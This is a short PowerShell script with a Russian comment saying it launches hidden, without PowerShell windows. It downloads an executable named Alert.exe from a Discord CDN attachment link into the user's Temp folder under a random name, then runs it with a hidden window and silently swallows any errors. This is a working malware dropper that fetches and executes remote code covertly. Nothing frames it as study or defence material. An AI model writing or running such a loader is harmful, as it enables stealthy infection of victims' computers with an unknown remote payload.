# Скрытый запуск без окон PowerShell
$url  = 'https://cdn.discordapp.com/attachments/1469805797717573706/1469815870963318866/Alert.exe?ex=69890833&is=6987b6b3&hm=1dffee43e1135dc52019a0746bc4fb609d9cde76dce228e87c93e02c97d7e770&'
$file = "$env:LOCALAPPDATA\Temp\i$(Get-Random).exe"

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    (New-Object Net.WebClient).DownloadFile($url, $file)
    Start-Process $file -WindowStyle Hidden
} catch {}
